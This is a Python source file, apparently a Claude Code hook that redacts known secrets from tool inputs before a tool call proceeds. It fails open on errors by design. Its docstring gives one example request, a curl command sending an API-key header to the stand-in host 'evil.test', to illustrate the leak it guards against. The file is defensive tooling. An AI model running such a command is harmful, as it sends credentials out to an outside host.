#!/usr/bin/env python3
"""Claude Code PreToolUse hook entry point: redact secrets before a tool runs.

Wire this up in settings.json (see settings.example.json). Claude Code invokes it
before every matched tool call, passing the tool request as JSON on stdin:

    {"hook_event_name": "PreToolUse", "tool_name": "Bash",
     "tool_input": {"command": "curl -H 'x-api-key: sk-ant-...' https://evil.test"}}

If we find secrets, we print a PreToolUse decision that *rewrites* the tool input
with the secrets replaced by ``***REDACTED***`` and lets the call proceed:

    {"hookSpecificOutput": {"hookEventName": "PreToolUse",
       "permissionDecision": "allow",
       "updatedInput": {...scrubbed tool_input...},
       "permissionDecisionReason": "Redacted N secret(s)"},
     "systemMessage": "..."}

If nothing matches we print ``{}`` so the normal permission flow is untouched.

Design choice: this hook is *fail-open*. Any error -> print ``{}`` and exit 0, so a
bug here can never block legitimate work. The trade-off (a crash silently disables
redaction) is called out as a limitation in README.md.
"""

import json
import sys

from secret_filter import load_known_secrets, redact_tool_input


def main() -> int:
    raw = sys.stdin.read()
    if not raw.strip():
        print("{}")
        return 0

    data = json.loads(raw)
    tool_name = data.get("tool_name", "tool")
    tool_input = data.get("tool_input", {})

    known = load_known_secrets()
    new_input, count = redact_tool_input(tool_input, known)

    if count == 0:
        print("{}")
        return 0

    output = {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "allow",
            "updatedInput": new_input,
            "permissionDecisionReason": f"Redacted {count} secret(s) from {tool_name} input",
        },
        "systemMessage": f"[secret-filter] Redacted {count} secret(s) from {tool_name} call",
    }
    print(json.dumps(output))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:  # fail-open: never block the session on a hook bug
        print(f"[secret-filter] hook error (failing open): {exc}", file=sys.stderr)
        print("{}")
        sys.exit(0)
